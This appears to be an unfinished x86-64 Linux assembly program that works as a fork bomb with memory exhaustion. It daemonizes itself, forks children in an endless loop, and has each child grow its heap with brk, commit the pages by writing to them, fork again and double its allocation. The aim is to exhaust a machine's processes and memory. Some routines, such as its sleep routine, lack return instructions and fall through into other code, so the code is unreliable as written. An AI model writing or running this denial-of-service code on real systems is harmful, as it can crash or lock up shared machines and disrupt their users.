;WORK IN PROGRESS
section .data

s dq 0
ns dq 10000000 ;10ms
pgid dd 0

section .text

global _start

exit:
    ;exit
    mov rax, 60
    xor rdi, rdi
    syscall

fork:
    ;fork
    mov rax, 57
    syscall 
    ret

daemon:
    call fork
    test rax,rax 
    jnz exit
    ret


daemonfork:
    call fork
    test rax,rax
    jz skipper
        call daemon; daemonize the child again
    skipper:

sleep:
    ;nanosleep
    mov rax, 35
    mov rdi, s
    xor rsi, rsi
    syscall


_start:
    
    call fork
    test rax,rax
    jz continue

    locked: ;idle spin lock main proces to prevent terminal detach
    call sleep
    jmp locked

    continue:
	;SEEDER CODE 

    call daemon

    start:

    call fork
	test rax,rax
	jz go

    call sleep

	jmp start
	go:

    ;GROWER CODE init 

    ;brk
    mov rax, 12
    xor rdi, rdi
    syscall

    mov rbx, rax ; get current state
    mov r12, 1024*1024 ;1M

    grow:
    ;GROWER CODE 

    ;brk
    mov rax, 12
    lea rdi, [rbx+r12]
    syscall

    call fork;daemonfork
    test rax, rax
    jnz grow

; call daemon

; ;setpgid
; mov rax, 109
; mov rdi, pgid
; mov rsi, pgid
; syscall

; call sleep


    ;dirty pages
    mov rcx, r12
    shr rcx, 10 ; /1024 ergo how manny kb
    lop:
    mov rax, rcx
    shl rax, 10 ;rax = rcx*1024
    dec rax
    mov byte [rbx+rax], 0
    loop lop
    ;TODO

    ;double page size
    shl r12, 1

    jmp grow

